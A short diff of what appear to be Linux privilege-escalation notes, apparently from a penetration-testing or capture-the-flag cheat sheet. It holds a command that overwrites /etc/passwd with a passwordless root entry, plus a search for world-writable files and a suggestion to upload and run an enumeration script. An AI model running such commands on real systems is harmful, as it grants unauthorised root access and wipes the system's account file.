@@ -3,4 +3,7 @@
 # is /etc/passwd there? if so "echo root::0:0:root:/root:/bin/bash > /etc/passwd" then do su to become root
 find / -perm -o+w 2>/dev/null
 
+# upload LineEnum.sh and run it
+# what files can you see? what access do you have?
+
 
